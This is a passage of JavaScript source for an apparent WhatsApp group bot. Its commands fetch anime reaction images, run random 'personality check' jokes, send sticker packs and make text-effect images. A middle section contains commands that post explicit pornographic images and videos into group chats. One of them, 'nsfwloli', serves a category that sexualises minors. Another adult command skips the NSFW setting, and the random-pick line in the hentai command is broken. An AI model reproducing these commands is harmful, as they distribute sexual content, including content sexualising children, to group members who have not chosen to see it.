            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await nyanBot2.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await nyanBot2.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await nyanBot2.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await nyanBot2.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await nyanBot2.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await nyanBot2.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await nyanBot2.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await nyanBot2.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await nyanBot2.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await nyanBot2.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'anime': {
if (!text) return reply(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await StickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return reply(`Could not find`)
let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
                await nyanBot2.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                }
                break
case 'hentaivid': case 'hentai': case 'hentaivideo': {
	if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return reply(mess.nsfw)
                await StickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                nyanBot2.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return reply(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return StickGroup()
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var NyanOnResult = pickRandom(ahegaonsfw)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: NyanOnResult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await nyanBot2.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'blowjob':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var NyanOnResult = pickRandom(ahegaonsfw)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: NyanOnResult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var NyanOnResult = pickRandom(ahegaonsfw)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: NyanOnResult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var NyanOnResult = pickRandom(ahegaonsfw)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: NyanOnResult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gangbang.json'))
var NyanOnResult = pickRandom(ahegaonsfw)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: NyanOnResult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/nsfwloli.json'))
var NyanOnResult = pickRandom(ahegaonsfw)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: NyanOnResult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var NyanOnResult = pickRandom(ahegaonsfw)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: NyanOnResult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var NyanOnResult = pickRandom(ahegaonsfw)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: NyanOnResult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return StickGroup()
	if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var NyanOnResult = pickRandom(ahegaonsfw)
nyanBot2.sendMessage(m.chat, { caption: mess.success, image: { url: NyanOnResult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await nyanBot2.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return StickGroup()
if (!AntiNsfw) return reply(mess.nsfw)
await StickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gifs.json'))
var NyanOnResultx = pickRandom(ahegaonsfw)
    await nyanBot2.sendMessage(m.chat,{video:NyanOnResultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await nyanBot2.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppxeon = await getBuffer(ppuser)
nyanBot2.sendMessage(from, { image: ppxeon, caption: profile, mentions: [bet]},{quoted:m})
break
case 'handsomecheck':
				if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
nyanBot2.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
nyanBot2.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					nyanBot2.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return StickGroup()
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
nyanBot2.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
nyanBot2.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
nyanBot2.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await nyanBot2.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await nyanBot2.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await nyanBot2.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await nyanBot2.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
	if (m.isGroup) return StickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await reply(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await reply('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				nyanBot2.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				nyanBot2.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else reply(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!q) return reply(`Example : ${prefix+command} nyanBot2`) 
await StickWait()
const photooxy = require('./lib/photooxy')
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
nyanBot2.sendMessage(m.chat, { image: { url: dehe }, caption: mess.success}, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return reply(`Example : ${prefix+command} nyanBot2`) 
await StickWait()
let link
